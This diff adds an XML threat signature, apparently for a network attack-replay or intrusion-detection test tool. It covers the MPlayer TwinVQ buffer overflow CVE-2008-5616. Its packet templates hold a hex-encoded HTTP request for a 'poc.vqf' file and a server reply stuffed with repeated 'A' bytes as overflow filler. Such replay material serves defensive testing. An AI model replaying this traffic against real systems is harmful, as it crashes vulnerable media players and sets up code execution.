@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MPlayer demux_open_vqf TwinVQ File Handling Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in MPlayer. The flaw is due to boundary error when processing TwinVQ files. A remote attacker may exploit this vulnerability by persuading the target user to open a malicious TwinVQ file. In a successful attack, arbitrary code is supplied and executed on the vulnerable target host. The behaviour of the target system is dependent on the malicious code. Note that any code executed by the attacker runs with the privileges of the logged in user. In an attack where code execution fails, the vulnerable application will terminate abnormally while parsing the malicious TwinVQ file."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IMAP/POP3/SMB/CIFS/SMTP/NFS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="MPlayer_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MPlayer_Project_MPlayer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="MPlayer_Project_MPlayer_1.0RC2_and_earlier"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-5616"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="003b19607a6474205cf3642205225de0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633988281917560815"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1263205805" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="AE"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="AF"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="AE"/>
+      <for index="AF"/>
+    </for>
+    <for index="Z">
+      <for index="AE"/>
+      <for index="AF"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:CA:00:08" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00B4" Identification="A4E5" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="3372" srcIP="172.16.8.202" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="38841" destPort="$HTTPdestPort" SeqNumber="5C88C155" AckNumber="36B22B78" HeaderLength="08" WindowSize="016D" Checksum="5299" UrgentPointer="0000" Options="0101080A04F065B79BBC2E62" Payload="474554202F7E706176656C702F706F632E76716620485454502F312E300D0A557365722D4167656E743A20576765742F312E31302E32202852656420486174206D6F646966696564290D0A4163636570743A202A2F2A0D0A486F73743A20737469636B790D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="Z" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:CA:00:08" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0533" Identification="0526" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="CEB2" srcIP="$destIP" destIP="172.16.8.202" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="38841" SeqNumber="36B26408" AckNumber="5C88C1D5" HeaderLength="08" WindowSize="0036" Checksum="66C5" UrgentPointer="0000" Options="0101080A9BBC2E6404F065B9" Payload="41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
